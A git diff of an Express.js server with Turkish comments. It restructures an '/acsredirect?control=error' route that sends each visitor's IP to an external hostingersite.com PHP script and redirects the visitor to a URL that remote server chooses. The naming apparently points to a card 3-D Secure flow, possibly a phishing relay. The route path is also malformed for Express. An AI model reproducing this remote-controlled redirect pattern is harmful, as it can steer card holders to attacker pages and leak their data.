@@ -233,16 +233,7 @@ app.get('/acsredirect', async (req, res) => {
       }
     );
     
-app.get('/acsredirect?control=error', async (req, res) => {
-  try {
-    const clientIp = getClientIp(req);
-    const response = await axios.post(
-      'https://forestgreen-rook-759809.hostingersite.com/dmn/acsredirect.php?control=error',
-      qs.stringify({ ip: clientIp }),
-      {
-        headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
-      }
-    );
+
     // Yanıtı logla
     console.log('Gelen veri:', response.data);
 
@@ -261,8 +252,33 @@ app.get('/acsredirect?control=error', async (req, res) => {
     res.status(500).send('Sunucudan veri alınamadı.');
   }
 });
+app.get('/acsredirect?control=error', async (req, res) => {
+  try {
+    const clientIp = getClientIp(req);
+    const response = await axios.post(
+      'https://forestgreen-rook-759809.hostingersite.com/dmn/acsredirect.php?control=error',
+      qs.stringify({ ip: clientIp }),
+      {
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
+      }
+    );
+ console.log('Gelen veri:', response.data);
 
+    // response.data string mi json mu kontrol et
+    const data = typeof response.data === 'string'
+      ? JSON.parse(response.data)
+      : response.data;
 
+    if (data.redirect) {
+      return res.redirect(data.redirect);
+    }
+
+    res.status(500).send('Yönlendirme bilgisi yok.');
+  } catch (error) {
+    console.error('acsredirect hatası:', error);
+    res.status(500).send('Sunucudan veri alınamadı.');
+  }
+});
 
 app.post('/veri', async (req, res) => {
   try {
